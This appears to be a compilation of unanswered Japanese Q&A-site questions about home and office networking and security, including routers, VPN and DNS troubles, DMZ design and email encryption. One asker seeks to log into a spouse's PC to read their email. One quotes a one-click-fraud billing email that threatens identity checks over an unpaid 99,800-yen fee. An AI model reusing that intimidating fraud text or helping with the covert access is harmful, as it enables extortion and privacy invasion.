なお、WillcomからXiに変更すれば解決するのですが、その方法は現状では出来ず、Willcomでの接続のみとなります。 長文での質問となりましたが、よろしくお願いします。
ネットワークインフラストラクチャ- windowse8ネットワークをみているのですが ネットワークインフラストラクチャ-というところです、 以前ここに２つのネットワークインストラクチャーが出現 盗聴かネットに侵入されているのですか ちなみに光電話です。ですが、
メール暗号化サービスについて調べています。 いくつか見つけたのですが、公開鍵を提供するのが受信者ではなくてサーバーからだったり、 公開鍵暗号の方式や鍵の長さ、誰が鍵を作成するのか、。。。が余りはっきりしません。 皆様のお勧めはどれになりますか？その理由もお願いします。 ここに無いものでも優れたものがあれば教えてください。 on-Demand「メール暗号化サービス」 暗号便アップローダー 開鍵暗号による暗号転送もサポート。 たとえファイル 「cybertrust sealed mail」は、電子メールの本文および添付ファイルを自動的に暗号化することで確実な情報の保護を実現する「メール暗号化サービス」です。 Zenlokは16日、ユーザーが送受信するメールを暗号化できる「ZenlokEメール暗号化サービス」の提供を開始した。暗号化メールをやりとりするには、同社サイトで公開している専用ソフトをインストールする必要がある。利用は無料。 　暗号化には公開鍵暗号方式を用いる。ユーザーは、メールアドレスを登録すると、PCのローカルに秘密鍵、Zenlokのサーバーに公開鍵が生成される。メール送信時は、Zenlokのサーバーから自動的に取得した公開鍵を使ってメールを暗号化。一方、受信時はPCに保存されている秘密鍵で自動的にメールを復号化する。復号時にも専用ソフトが必要となる。同サービスは「S/MIME」および「OpenSSL」に基づいて開発されているという。 ユニアデックス株式会社（本社：東京都江東区、社長：入部 泰、以下 ユニアデックス）は、電子メール全文と添付ファイルに対する世界最高水準の強度の暗号化を、システム側が強制的にかつ高速で実施するクラウド型「メール暗号化サービス」を、本日から提供開始します。 「メール暗号化サービス」はメール全体（全文と添付ファイル）をメール送信経路上で強制的に暗号化し、メール受信者が後から送付されるパスワードによりメールを復号化して使うサービスで、情報システム管理者は漏れのない一括管理が可能になります。 サービスの種類は、一般的な「ZIP暗号化」方式を採用した標準タイプと、世界最高水準の「Camellia（カメリア）暗号化(注1)」方式を採用したオプションタイプの2種類です。標準タイプのサービス料金が月額126円/ID、「Camellia暗号化」方式を追加する場合が、月額178円/ID（いずれも税込み）です。
こんにちは。 いきなりですが、HPってどうやって改ざんされるのですか？ 今時FTPでウェブサーバーにアップロードしてる人なんていませんよね？ SSHだって暗号化されてて解読は難しいでしょう。 ウェブサーバーにRSHサーバーを置いたりしてるとか・・・？ RSHサーバー置いててもログインは難しいでしょうし。 知ってる人いたら教えて下さい。
大学のユニバーサルパスポート使用中に、成績のページと講義別のページを複数のウィンドウに分けて使っていたためか、以降下のエラーしか見られなくなりました。（今回初めてしたため、これが原因の可能性が大きいです） 大学の担当課に行く以外に治す方法はないでしょうか？ internet explore、それ以外のブラウザも試しましたが、ページが開けないため質問させてください。 よろしくお願いします。 SSL 接続エラー サーバーとの安全な接続を確立できません。サーバー側に問題があるか、サーバーが必要とするクライアント認証証明書を所持していない可能性があります。 エラー 107 (net::ERR_SSL_PROTOCOL_ERROR): SSL プロトコル エラーです。
CISCOスイッチのメンテナンスをする際、広い敷地に散在する 多数のスイッチの場所まで出向いてコンソールからメンテする わけにもいかずtelnetでリモートメンテするんですが、まず 現状のstartup-configをバックアップし、いろいろrunning-config をいじった末、どうも再起動しないと設定変更が反映されないなぁ という事が多々あり、しかたなくwriteしてリブートするもうまく いかず結局元に戻そう、となる事があります。そういった際に tftpであれteratermからのコピペであれその時のrunning-configと マージされてしまうので、いちいち目視でじっくり確認して作業 しているのですが、もっと上手い戻しかたってあるんでしょうか？ どなたかご教示宜しくお願いいたします。
よろしくお願いします。 ファイアウォール製品のカタログを色々見ているのですが、 通信ポートのブロック以外にも、「スパム・ウィルス対策機能」など、 別のセキュリティ要件に対応する機能を備えた機器もあるみたいです。 こういった機器は、ファイアウォール製品、と呼ぶよりは 「ファイアウォール相当の機能を持ったアプライアンス製品」と呼ぶのが正しいのでしょうか？。
教えてください。 PPPOEで接続しているルータの下にあるDMZゾーン内のWEBサーバにNATを使用せずグローバルアドレスをDHCPで付与するということは可能なのでしょうか？ OCNでそのようなサービスがあるのでしょうか？WAN側からの接続に問題ないでしょうか？ FTPの場合どうなのでしょうか。 よろしくお願いします。
無線LAN初心者です。２階でパソコンを有線で繋いでます。 WZR-450HPを購入しました。 アイフォン5、PS3は問題なく出来ましたが、 １階に置いてあるノートパソコン（機種はFMV-C8220です。OSは、Windows　XP） だけが出来ません。 無線LANの機能はあるはずなんですが、ネットワークアダプタに表示されません。 Marvell Yukonというドライバはありました。 これは、無線LANアダプタを買うしかないのでしょうか？ あと関係ないのかもしれませんが、 富士通のホームページで、ドライバーダウンロードがありました。 そこで無線LANドライバーをダウンロードすれば大丈夫なのでしょうか？ 素人なので、うまく説明が出来てませんがお願いします。
STPやRSTPは閉ループに関わる全ポートでONにしないと 機能は保証されませんか？CISCOのスイッチで実験したら 半分くらいのポートでSTP=ONとするだけでも機能したん ですが、理論的にどうなのかを知りたいです。 宜しくお願いいたします。
インターネットに公開しているWebシステムのDBサーバを内部ネットワークに置くのがよいのか、 DMZに置くのがよいのかで悩んでいます。 ※ここでいうDBサーバは、個人情報を取り扱っていますが、外部に公開していない別の システム等が使用しているデータは居候していません。 以前の私の認識では、WebサーバをDMZに置き、DBサーバは内部ネットワークに置いて、 DBサーバへの接続はWebサーバからのみに限定するというのが一般的なのではないかと 思っているのですが、今も同じでしょうか？ 内部ネットワークにDBを置いた場合、次の問題が考えられるので、本当に大丈夫なのかと 思ってしまいます。。 - DMZから内部ネットワークへの通信が許可しなければならないこと。 - WebサーバとDBサーバの接続をFWで遮断したとしても、WebサーバからDBサーバに 接続するためには、あらかじめWebサーバの設定ファイルにDBサーバのユーザ名とパスワード を書いておく必要があります。なので、、WebサーバとDBサーバ間のFWがあまり役に立たないのではないか。（Webサーバが乗っ取られた時点で、苦労なく個人情報も抜かれるリスク大） そればかりか、DBサーバを内部に置くことで、DBサーバをDMZに置いた時よりも内部 ネットワークが脆弱になると考えられる。（DMZから内部ネットワークへの通信を許可する必要あり） - 総合すると、最近の Linux や Windows にはFW機能があるので、何も内部ネットワークに 置かなくても、その機能を有効化しサーバ自体はDMZに置けば内部ネットワークに置くよりも 全然よいのではないかと思える。 よろしくお願いいたします。
windows2008 r2 をサーバーとして利用しています。 セキュリティに関してはあまり詳しくないのですが、ルーターからハブを経由てネットワークを構築しています。 そこで、ルーターを開放しない（外部からのこのサーバーアクセスができない）状態であれば、外部からのセキュリティは問題ないでしょうか？ もしかしたら、自分が知らないだけで外部からできているのかもしれませんが。（初期状態のままです） もちろん、メールからのウイルス感染などはセキュリティソフトで守る必要があるとは思っていますが、外部からの進入は防げているのか？ 情報は何を書いてよいかわかりませんが、セキュリティ関係はほとんどいじっていません。 よろしくお願いします。
hotmailに添付された画像をダウンロードしてから印刷しましたが、このデータはどこかに残っていますか？削除したいのですが、pcについて詳しくないのでわかりやすく教えていただけませんか？windowsを使っています。
フリーファイルオープナーから電子メールを受け取るためにサインアップしていただきありがとうございますと、サブスクリプションをアクティブにするために、下のリンクをクリックしてください。我々は、このステップは、当社の加入者との関係を保護し、迷惑メールを防止するために必要です。 [マイ·カレンダーから電子メールを受け取りたくない場合は、上記のリンクをクリックするまで、サブスクリプションが開始されませんので、何もする必要はありません。敬具 Tweak Softs -------------------------------------------------- ------------------------------ この電子メールについてこれは、新しい電子メールの加入者の電子メールアドレスを確認するための1回限りの電子メールです。あなたはこの登録を承認しなかった場合は、誰かが誤ってあなたの電子メールアドレスを使用して登録されています。我々は不便を後悔している。注：この電子メールには返信しないでください。この電子メールは、自動化されたサービスによって生成されました。 間違ってメールを送ってしまって、このメールが来ました大丈夫でしょうか？ 英語だったので翻訳してあります。
セキュリティソフトの性能比較の為に、 『AVASoft Professional Antivirus』 のウイルス検体が欲しいのですが、 この様なウイルスのダウンロードなどは可能でしょうか？ ご回答よろしくお願いします。
前ではDELLで新しいパソコンを買いましたがWindows 7 プロダクトキーを再インストールを試みました。 経験がある方教えてくださいませんか。
こんばんは。自宅サーバの初心者です。開放ポートの設定をしたいですが、いくつのサイトを検索してもすべての方法は通用しません。 OSはwindows 8 で今使ってるルータはNTTのGE-PON-ONUのタイプDです。以下はipconfig の結果です。 DHCP有効　はい 自動構成有効　はい Ipv6 アドレス　2408:11:9480:8300:c8ee:35f0:29ff:b4ae 一時 Ipv6 アドレス　2408:11:9480:8300:9d3b:5393:66e3:38f2 リンクローカル　Ipv6 アドレス　fe80::c8ee:35f0:29ff:b4ae%15 自動構成　Ipv6　アドレス　192.254.180.174 サブネットマスク　255.255.0.0 デフォルト　ゲートウェイ　fe80::212:e2ff:fe70:5f40%15
「ネットワーク ゲートウェイはアクセス可能ですが、インターネットからのネットワーク トラフィックを受信できませんでした」とはどういうことですか？ 知識のない自分にも解りやすく説明してくれるとありがたいです。
セキュリティーの専門家？に聞いたのですが、MSEは無料で使える代わりに、その対価としてPCの内容を送信している。 Defenderは無料で使える代わりに、その対価として、訪れているHPや検索ワードを送信していると聞きました。 もし本当であれば、プライバシー上非常に懸念される自体だと思うのですが、この情報は本当でしょうか？
ルーターにパスワードをかけていても、外部から簡単にリセットして侵入できると聞いたのですが本当でしょうか？
Aterm wr8370nのルータを使ってましたが繋がらなくなりました。どうすればいいですか？ 一週間ほどルータの電源を消していて、その後電源をつけて接続してみると全く繋がらなくなりまし PCからルータまでは有線、無線ともに問題なく繋がっていますが、ルータからネットは全く繋がりません。 先にルータの電源入れてからPCを起動して接続しても無理でした。 どうすれば解決するのでしょうか？ 初期化を行っても変わりませんでした。 自分はあまり知識が薄いので、方法などをできるだけ詳しくお願いします。
dionのグローバルIPアドレスを変更したいです 私は友人同士の小さいコミュニティ内でゲームのサーバーを開いているのですが、アクセスログを見ると最近不明な場所からのアクセスが頻発しています。 そこで、IPアドレスを変えたいのですがグローバルIPの変更方法が分かりません。 固定IPサービスではないのでモデムの電源を切って再接続してみたのですが、何度やっても変わりません。 アドバイスよろしくお願いします。
社内では基本的にオンラインストレージなどの利用は禁止、となっている会社でも 社外との業者とのデータのやり取りにCDなどのメディアでは手間がかかるから、 "宅ふぁいる便"や"Firestarage"を使わせてもらいたい、という社員からの要望があると思います。 情報システム部門はどのような対応をしていますか？ ウチでは情報システム部門に申請を行い、申請が承認されればＯＫ、といった感じなのですが、 手続きが形骸化している気もします。 会社ごとのポリシーによる、といわれればそれまでなのでしょうが、 ・ウチではこうしている ・このようにすべきである ・こんな事例がある といった話を聞かせて頂きたいです。
詳しくはわからないので質問しましたが コマンドの動作が少し変だったりウイルス的スクリプトキディみたいな現象が起こります どうもpcではなくインターネットに問題がありそうです pcを変えても変えても問題が出るので なんか間違えの可能性もあるが ルータの外でたあとプロバイダにつながってインターネットに入り相手のサーバにたどり着くわけですが インターネットが二個あるイメージみたいな感じです 結構困っています
現在、十数台のＸＰパソコンが繋がったネットワークにＷｉｎ８パソコン５台を追加しました。 このネットワーク内にアイオーデータのＬＡＮＤＩＳＫがあり、その中には、ＰＣを限定して開けるフォルダと接続された全てのＰＣが開けるフォルダがあります。（ＩＰアドレスでフィルタをかけています） Ｗ８－ＰＣ５台は、そのＬＡＮＤＩＳＫのフォルダにアクセスできますが、Ｗ８－ＰＣの６台目を追加しようとしましたが、このＰＣだけＬＡＮＤＩＳＫにアクセスできません。 それまでのＰＣはネットワークに接続して、ＬＡＮＤＩＳＫを開くと全てのフォルダが見えます。また、Ｆｒｅｅのフォルダもすぐに開けました。 権限の無いＰＣがフィルタのかかってるフォルダを開こうとするとネットワークパスワードの入力を求められますが、６台目のＰＣだけ、なぜか、Ｆｒｅｅのフォルダどころか、ＬＡＮＤＩＳＫすら開けず、ネットワークパスワードの入力を求められます。 ６台目ＰＣだけ、それまでの５台のＷ８－ＰＣと違うところは、デスクトップ上にホームグループのアイコンが、いつからか出来ています。（最初は無かった）５台のＷ８－ＰＣにはありません。 何が違っているのか？どうしたらアクセスできるようになるのか、教えてください。
SNMPについての質問です。 とあるストレージ管理ソフトウェアの仕様を眺めていたところ、SNMPｖ１にのみ対応しているものや、SNMPv2cに対応しているものがありました。 このSNMPｖ１とv2cは、調べてみるとv2cではGetBulk, INFORM request, Reportが追加されたとの記載がありました。 確かにv1とv2cでは違いがあるようですが、これらの違いはソフトの利用者の視点からするとどれほど違うものなのでしょうか。 v1を選ぼうがセキュリティレベルは変わらないようですし、内部の技術的なところが違うからといって、v1でもv2cでもやってることは基本同じだと思うのですが、どうなのでしょうか。 所詮趣味ベースの知識しかない一般人でも分かるように、v1とv2cとの違いをご教示いただきたく思います。 また、v1を使うことによるデメリットがあればあわせてご教示ください。
大手の建設業社とのJVで工事をすることになりました。 インターネットについて教えてください。 現場事務所は、弊社建物を使うのですが、インターネット回線をJV用に引くように言われました。 大手さんはグローバルIPにて本社とのやり取りを行うので、別回線でインターネットがつながるようにしてほしいがルータのIPを10.××.××.50にでもしてくれとのことです。 これは、通常の光回線を契約し、ルーターのゲートウェイを10.××.××.50にすればいいのでようか？ それともプロバイダ契約時に10.××.××.50の固定アドレスを貰うようにしないといけないのでしょうか？ 教えてください。お願いします。
Windows8のコマンドプロンプトで動くSHA3計算ソフトありますか？ 引数として与えた文字列のSHA3を取れて、そのままシンプルに出力してくれるのがベストです。 ファイルハッシュは取れなくてもいいです。 できればフリーソフトでお願いします。 よろしくお願いします。 理由：現状、電子情報におけるあらゆる名前付けにSHA256を使っている・・・使っていくつもりだが、 最近、英語版ウィキペディア辺りでもCollisionについて何やら記述されるようになってきた(http://en.wikipedia.org/wiki/Cryptographic_hash_ … 下のほうの表にYesとある)ので、 個人的にしか使っていないとはいえ、他人に質問されると説明が面倒なのでSHA3に移行したい。 現状の使用例をYoutube動画に上げてみました。() 参考まで。 実際には殆ど使っていません。ほぼ上の動画のケースだけです。 なので急ぎではないです。
富士通のSi-R80brinというルータの設定をしていたのですが 設定を間違えてLAN1ポートのIPアドレスを自動取得にしてしまい 設定画面に入るためのIPアドレスが不明になってしまいました どうにかLAN1ポートのIPアドレスを調べることはできないでしょうか？ よろしくお願いします 工場出荷時に戻す方法は出来れば取りたくないです
ネットに固定ipで接続しています。メールはウェブメールを使ってるのですが、自分が送るメールのヘッダ情報に自分の固定ipが入ってしまいますよね。固定ipはウェブ上のいろんなところに自分の足跡として残されてるので、メールの送信相手にそれを触れまわりたくありません。プロキシをかませて送信する方法もありますが、ウェブメールなのでプロキシサーバ設置者にパスワードなどを抜かれるのではないかと心配です。なんとか自分の固定ipを隠す方法はないでしょうか。自分の接続業者の固定ipは強固で、モデムの電源を引き抜いても、何をやっても数年変わっていません。
windows7でVPN（PPTP)接続でDNSサーバのアドレスを自動取得にすると名前解決ができません。 インターネットアクセスなしと表示されます。 名前解決が出来きていないため、表示上はインターネットアクセスなしと出ていますが、 IPアドレスをたたくとインターネット接続できるので繋がってはいます。 VPNクライアントの「VPNのプロパティ」→「ネットワーク」→「インターネットプロトコルバージョン４」の設定で DNSサーバのアドレスを自動で取得にして、PPTPサーバからDNSサーバのアドレスを自動取得すると （１）のようにルータのDNS（192.168.11.1）が自動で取得されているのですが、なぜか名前解決ができないんです。 192.168.11.1にはpingは通りますしVPN接続は完了しています。 （２）のように手動入力すると名前解決できるようになりインターネットアクセスなしから解放されます。 また（１）においてiphoneから同じようにVPN接続すると、DNSサーバのアドレスが自動取得できて名前解決できているようでネットに繋がります。 なのでVPN接続先のルータのDNSの動作がおかしいとは思わないんです。 windows7のネットワークに問題があるかVPNクライアントに問題があるのか、DNSサーバからアドレスを自動取得しているくせに名前解決の結果を得ることができていないです。 当然この場合、nslookup www.yahoo.co.jpとしてもIPアドレスに解決されませんでした。 （１）DNSサーバのアドレスを自動取得する PPP アダプター VPN: 接続固有の DNS サフィックス . . . : 説明. . . . . . . . . . . . . . . : VPN DHCP 有効 . . . . . . . . . . . . : いいえ 自動構成有効. . . . . . . . . . . : はい IPv4 アドレス . . . . . . . . . . : 192.168.11.4(優先) サブネット マスク . . . . . . . . : 255.255.255.255 デフォルト ゲートウェイ . . . . . : 0.0.0.0 DNS サーバー. . . . . . . . . . . : 192.168.11.1 ←※DNSサーバのアドレスを自動で取得すると名前解決されない NetBIOS over TCP/IP . . . . . . . : 有効 ============================================================================= （２）DNSサーバのアドレスを手動入力する PPP アダプター VPN: 接続固有の DNS サフィックス . . . : 説明. . . . . . . . . . . . . . . : VPN DHCP 有効 . . . . . . . . . . . . : いいえ 自動構成有効. . . . . . . . . . . : はい IPv4 アドレス . . . . . . . . . . : 192.168.11.4(優先) サブネット マスク . . . . . . . . : 255.255.255.255 デフォルト ゲートウェイ . . . . . : 0.0.0.0 DNS サーバー. . . . . . . . . . . : 8.8.8.8　←※手動入力すると名前解決される NetBIOS over TCP/IP . . . . . . . : 有効 ご指導のほどよろしくお願いします。
お世話になります。 IPV4では、第１オクテット～第４オクテットと言っていましたが、IPV6では何というのでしょう。 ８ビットから１６ビットになって言い方も違うのだと思います。 ご存知の方教えてください。よろしくお願いいたします。
通常ＩＰアドレスを設定してネットワークに接続しているのですが、 1台のWindows８ＰＣは問題なく接続できていますが、 ２台目のWindows8ＰＣが接続できません。 識別されていないネットワークと表示されています。 ＩＰアドレスを登録すると、イーサネットの状態・詳細に IPv4アドレスが２つ登録されていて１つは ＩＰアドレスを自動取得に変えれば消えるが、もう1つは常にある。 削除できないものなのか？ ネットワークに接続できているWindows8ＰＣは IPv4アドレスが１つしか登録されていません。 どうしてもう１つがとうろくされているのか、またどうすれば削除できるのか教えてください。
携帯に、何者かがフェイスブックの友達申請をしてきました。 申請を受け入れると、フェイスブックのデータが全部無くなり、 何者かに乗っ取られました。 すぐにパスワードをかえ、新しい画面を立ち上げまいたが、 古い画面と新しい画面が２つ残り困っています。 古い画面の削除と、ハッキングされたデータは悪用されないか心配です。 対策を教えてください。
BUFFALOの無線LANにした際に手動設定をするつもりなので SSIDを考えているのですが、もし悪意のある近隣住民がこちらと同じSSIDしてきたら、対策としてはどうすればいいでしょうか？
Windows XP プロダクトキーの新機能について玄人か紹介してくださいませんか。
OpenVPNをインストールしたらローカル 社内の担当者が回答してくれないので、ご教示いただけると助かります。 その担当者がPC（Windows 7 Professional）にOpenVPNクライアントをインストールしたのですが、 インターネットに接続できるものの、同一セグメント上の他PCやアクセス権を設定していないNAS、同様に共有フォルダなどに接続できなくなりました。 ネットワークエラーというウインドウが表示されます。 「\\（NASなどのIP）にアクセスできません」という内容です。 そこで、担当者が作成したマニュアルに従ってクライアントソフトを削除しましたが、それでもローカルに接続できません。 質問です。 １）現状からローカルに接続できる方法があればご教示ください ２）社内的に本件が多発しているようなのですが、原因はなんだと思われますか 　　VPNの管理設定の担当者は同じで、過去にWindows XPでも同じ現象があったようです。 ３）VPNは特定のサーバーと通信するようですが、サーバーのIPや通信のルートを特定するコマンドはありますか 　　※OpenVPN削除後もVPNサーバを介し通信しているのではないかという素人考え ４）OpenVPNを導入したPCのHostsファイルは中身が空白になります。関係ありますでしょうか。 　　もともとは、デフォルトで記述されている"#"付きの説明文だけです。 PC環境は以下です。 なお、担当者から配布されたOpenVPNのマニュアルなどはすべて回収されてしまいましたので、OpenVPN関連の仕様は不確かです。すいません。 また、ネットの情報では、VPNのネットワーク接続のキャプチャがあって、「VPN接続時にローカルも接続する」旨のチェックボックスがあるものが散見されましたが、自分の環境ではそのような項目やタブはありませんでした。 クライアントのシステム：Windows 7 Professional 導入ソフト：OpenVPN 2.3.0 　　　　　　TAP-Win32 Adapter V8 　　　　　　Symantec Endpoint Protection(クライアントPCでは設定変更不可) 他：ネットワーク接続の中に「TAP-Win32 Adapter V8」が残っています 　　新規作成したユーザーアカウントでも同じ現象でした 　　VPNのサーバーは今も稼働しているらしいです 　　VPNのサーバーのIPは不明です 　　ローカルの資産へPingは通ります
通常、GWを通過する際にHTTPヘッダに付与されるX-JPHONE-UIDですが、 これはどういった基準で端末を識別して付与しているのでしょうか。 IPアドレスなのか、SIMに含まれる何かしら特別な情報なのか。 また、事前にHTTPヘッダを改竄しX-JPHONE-UIDの値を変更して送信しても GWにて上書きされてしまうため偽装される事はないとの事ですが 本当に全く可能性はないと言い切れるものなのでしょうか。
ただ今、離婚調停中の者です。 相手の浮気調査に必要な情報を探索しているのですが、パソコンのメールに 証拠があると思われますが、パスワードが分からず、困っています。 一般的なパソコンにログインするための操作方法を教えて頂ける方、お願いします。
　ADSLを使っています。ロジテックLAN-WH450N/GPとWin7ノートPCで11,nでネット接続していました。 先日、このルーターから電波が飛んでいないことをメーカーサポートと動作確認をしたうえでメーカー修理となり購入店へ修理依頼。帰ってきたもののネットにつながらなくなってしまいました。 　修理後、S/N　SSID セキュリティーキーが変わってしまっていて、購入時と同じように新しい1st SSIDとセキュリティーキーを入力したところネットにつながらず、試しに2nd SSIDを入れたところ11.gではありますがネットにつながりました。11.gでもいいのですが、できれば11.nでつなぎたいです。なぜ1st SSIDでつながらないのか又、2ndSSIDでも11.nで通信可能でしょうか。特にこのルーターを使っていらっしゃる方教えてください。よろしくお願いします。
ある方のHPをみていたら、画面が暴走して、英語で２つのＯＳが破壊されており、復旧のために費用を払うか否か（PAY OR NOT）の文字がでてきました。 わけもわからず、費用を支払う訳にはいかないため、NOTをクリックするとウインドがいくつも重なってでてきて、最後に画面が真っ黒に。 NECのデスクトップＰＣだったため、ヘルプデスクに電話して復旧を試みるも、ＮＥＣのロゴがでできた後、画面は真っ暗になり制御不能になってしまいました。 ヘルプデスクのアドバイスは、日本データ復旧サービスを呼んでデータを取り出した後、ＯＳ（ウインドウズ７）を再インストールするしか手はないとのことでした。 ホームページで非難中傷のコメントやＳＥＯ等の勧誘が多いため、テロ攻撃ではないかと感じてますが、友人はウイルスを巻き込んだとの推測です。 トレンドマイクロのウイルスバスターをインストールしていたのですが・・・ 費用を格安にあげるために、ウインドーズ８のアップグレード版（データはそのまま？）をインストールすればいいのではないかと思い、ヤマダ電器の店員に確認すると難しいとの話。 やはり、専門の店にもっていって修理（復旧）してもらうしか手がないのでしょうか？費用はどのくらいかかるかも心配です。一番ベストはどうすればよいかアドバイス頂けたら助かります。 また、ＯＳが破壊されたのは、テロ攻撃でなくてウイルスなのでしょうか？
最近気がついたのですが、このサイトでも同様ですが、ＩＤやパスワードの入力時に、枠の右端にはじめから記号がでていることに気がつきました。 ＩＤでは＊＊＊＊＊（空白）の右端に×印　　　　パスワードでは、中央にドットがある目のような記号が右端についており、そこをクリックすると表示されていなかったパスワードが表示されます。 いつからか気がつきませんが、みなさん、気がついていますでしょうか？
いい歳して、クヨクヨするタチで、いくつかのサイトで、相談にのっていただいています。 先日、ある相談サイトに書き込み、数人の方々に親身な回答を頂きました。 数日たち、ふと気になりその相談サイトを開くと、新しい回答がありました。 その相談サイトは、ＩＤもニックネームも不要で、私は匿名で書かせて頂きました。 匿名で書かれる方も多く、頻発に利用するサイトではないので、匿名にしました。 話は戻りますが、その方の回答が、「あなたもそんな女性らしい悩みがあるんだ」 「貴方のコメントはいつも上から目線で偉そうなんだ」とか「貴方は可愛げがないんだよ」など、まるでいろんなサイトで、私の書いた内容を全て知ってるかのような言葉が並んでいました。 僭越ながら、私は回答もさせていただいています。自分の経験から回答する事も、あるいは、浮気を正当化するような内容にはキツイ言葉も書きますが、人を侮辱したり誹謗中傷したりするような極端なコメントをしと事はありません。 いくつもあるこのような相談サイトで、これとこれを書き込んだのは同一人物だ、と限定する事などできるのですか？ その方は、毎日相談サイトを端から端までチェックして、これらを書いたのは、同じ人間だ、と思い込んでいるのですか？それとも技術的に人物を特定できるような、何かがあるのですか？ その方のコメントには、「お人違いでは？」と一応お礼欄に返事はしましたが、「お前の書いた内容は、どんなサイトでも読んでるぞ」と言われているみたいで、気味が悪いです。 相手が分からないからこそ、被害妄想的になっているのかもしれないですが、いい歳してちょっと怖いです。 ネットに詳しい方もそうでない方も、わかりにくい文ですが、教えて下さい。
しばらくスリープ状態だったパソコンンを開いて見ると このネットワーク上の別のコンピューターが、このコンピューターと同じ IPアドレスを使用しています。 このコンピューターで、ネットワーク接続の問題が発生する可能性があります。 このような内容のウィンドウが出ていました。 こういった場合どうような対処をしたらいいのでしょうか？ パソコンはあまり得意でないので、詳しくご説明頂ける方 宜しくお願いいたします。
閲覧ありがとうございます。 先日、いきなりネットに繋がらなくなってしまい、一晩おいたらネットに繋がりました。 普段のようにニコニコ生放送を観ようとすると、永遠に 読み込み中・・・ と出ます。(他のPCも同じ） さらに、全てのオンラインゲームが出来ません。「現在、サーバーの問題で接続出来ません」と出ます。 エラーコードを調べると『ネットワーク環境が不正であるか，通信障害が発生したおそれがあります。』らしいです。 混雑していないと思われる時間帯にも試しましたが無理でした。ねこ戦車などのブラウザゲームもできません。 TwitterやYoutube、メール、ニコニコ動画（生放送のみ×）などは快適にできるんです。 ---------------------------------------- OS windows7 回線 光 プロバイダ ビッグローブ セキュリティソフトは使用していません。 モデムはNTTのv110です。 http://www.ntt-west.co.jp/kiki/consumer/flets/v1 … ルーターはバッファローの型番wzr-hp-ag300hです。 http://buffalo.jp/products/catalog/network/wzr-h … ---------------------------------------- ゲーム以外にも特定のサイトが見れない等ありませんか？ →今確認できているのはオンラインゲームや生放送だけです。 ご自身でモデムやルーターに何らかの設定をした事（PCやネット速度アップ等）がありますか？ →全くしていません。ゲームなどが出来なくなってからルーターを初期化しましたが改善しません。 突然できなくなったのでなにが原因かわかりません。 考えられる原因はありますでしょうか？ 解決方法を教えて下さると助かります。
インターネットを観覧中に変なサイトが開いてしまい会員登録されてしまいました。 退会を試みたのですが↓のようなメールが送られてきて・・・。 退会処理不可 ============================== ご利用料金の精算が済んでおりません。 ============================== 請求金額：99,800円 登録日時：2013-03-02 17:40:41 会員番号：××× 携帯端末情報：××× 尚、以上の情報は不払いが起きた際、身元調査の為の情報となります。 ============================== お問い合わせ 電話番号：03-****-**** メール　：info@**************.com 振込先確認： http://**************.com/payment.html ============================== 【ご注意】 料金未納会員に対して身元調査後、直接ご請求する際に事前通知は一切致しませんので、予めご了承下さい。 ------------------------------ 当番組はご自信の意思により年齢認証・携帯固体識別認証、制限解除をして登録された映像送信型性風俗特殊営業済みの公式アダルト動画サイトです。 ------------------------------ 電気通信事業届出済み 映像送信型性風俗特殊営業済み ------------------------------ その他ご不明な点がございましたら、本メール上部にございますお問い合わせからサポートセンターまでご連絡をお願い致します。 スタッフ一同、更に良いコンテンツ制作を目指しておりますので今後とも宜しくお願い致します。
「LPIC-レベル1」と，「CCENT」では，どちらが取得難易度が高いでしょうか。 よろしくお願いします。
私は、現在SSL（https）について勉強しております。 ブラウザごとに鍵マークの表示が変わることに疑問を持っております。 同じ「https」なのに、「Chromeだと緑」で「FireFoxだと色なし」だったりと 違う場合があると思います。 （この件についてはEV SSLと言う事で認識しておりますが、 　認識が間違っておりましたらご指摘ください） 質問したい内容ですが、 「同じサイトでも、Chromeだと鍵マーク（緑）が表示されているが、 FireFoxだと鍵マークが表示されない場合がある」と言う話を 聞きました。 どのようなHTML記述だとこの現象になり、またこういったサイトを ご存知の方がいらっしゃいましたら、教えていただけませんでしょうか。 素人で大変恐縮しております。 宜しくお願い致します。
pcanywhere(ver問わず)の機能で、ファイル転送という機能があり、 パソコンA（リモート側）からパソコンB(ホスト側）に接続し、 ホスト側のＰＣを操作、画面閲覧は可能としながらも、 このファイル転送の機能のみを禁止したいのですが、何か方法を ご存知の方（思いつく方）いらっしゃいませんでしょうか。 ※パソコンＢには個人情報が含まれた重要なファイルがあるとします。 目的は、ホスト側のＰＣのファイル（テキスト、画像など）をリモート側に 持ち出すことを防ぎたいというもの。 パソコンＡからパソコンＢへのファイル転送も同時に禁止になっても 構いません（本当はパソコンＢ側からパソコンＡのみを禁止したいですが多分無理・・） 問合せましたが、pcanywhere単独では不可能のようです。 パソコンＡについては、ネットワークに接続しないスタンドアロン状態にし、 ＵＳＢやＣＤなど外部媒体の使用は全て禁止にしてあります。 ファイアウォールでpcanywhereの使用ポートを防ぐと、リモート自体が できなくなってしまうのでダメ。。 パソコンＡ側はpcanywhere以外の機能は全て使えなくなっても構えません。 （エクスプローラやスタートメニューなどWindows機能全て） どなたか知恵をお貸しください。
以前ここで 「友達のパソコンが、ハッキングされました！仕返しをしたいのでハッキングの方法を教えてください。」 という質問に対して、（この質問ブラッディマンデイ放送時に多い） 「仕返しをするより、 警察に連絡しましょう。あとそれはハッキングじゃなくてクラッキング。」 という回答をされる方がいました。 しかし、人が死んだわけでもないのに、個人のために警察がプロバイダーに情報開示を請求するのはありえないとおもうのですが。しかも今は中学生でもtorや多段串くらいは知っています。 確かにそれらは完全な匿名性を保証するものではないので、不正アクセス者を追いかけることは可能ですが、それには多大な時間と労力がかかります。 わざわざ警察がそれを行なうとはとても思えません。 ならば、個人レベルで被害にあった方は、事実上、泣き寝入りか、仕返しの二択しかないのでは？もちろん素人には仕返しなどムリですし、クラッキングの方法を教えてしまっては、犯罪を助長する可能性があります。 しかし少なくとも、今後被害に合わないような対策の方法ぐらいはあるでしょう。 「それはクラキングだから。警察に言え。」 というのはちょっと不親切だと思うのですが？
現在セキュリティの勉強をしているものです。 前に何処かのサイトで 「どんなに高性能なトロイでもパソコンの電源を入れることはできない。」 というのを見たのですが、今読んでいる「サイバー犯罪・サイバーテロの攻撃手法と対策」 という本に 「マルウェアによってパソコンの電源が勝手に入る（切れる）ことがある。」 という記述がありました。 そんなことあり得ますか？
